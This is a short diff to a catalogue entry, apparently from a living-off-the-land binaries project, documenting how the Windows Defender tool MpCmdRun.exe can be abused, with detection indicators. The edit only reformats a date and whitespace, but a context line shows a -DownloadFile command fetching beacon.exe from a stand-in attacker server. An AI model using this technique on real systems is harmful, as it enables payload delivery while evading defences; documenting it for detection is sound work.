@@ -2,7 +2,7 @@
 Name: MpCmdRun.exe
 Description: Binary part of Windows Defender. Used to manage settings in Windows Defender
 Author: 'Oddvar Moe'
-Created: '09/03/2020'
+Created: 2020-03-20
 Commands:
   - Command: MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\temp\\beacon.exe
     Description: Download file to specified path - Slashes work as well as dashes (/DownloadFile, /url, /path)
@@ -32,9 +32,9 @@ Full_Path:
   - Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.4-0\MpCmdRun.exe
   - Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.7-0\MpCmdRun.exe
   - Path: C:\ProgramData\Microsoft\Windows Defender\Platform\4.18.2008.9-0\MpCmdRun.exe
-Code_Sample: 
-  - Code: 
-Detection: 
+Code_Sample:
+  - Code:
+Detection:
   - IOC: MpCmdRun storing data into alternate data streams.
   - IOC: MpCmdRun getting a file from a remote machine or the internet that is not expected.
   - IOC: Monitor process creation for non-SYSTEM and non-LOCAL SERVICE accounts launching mpcmdrun.exe.
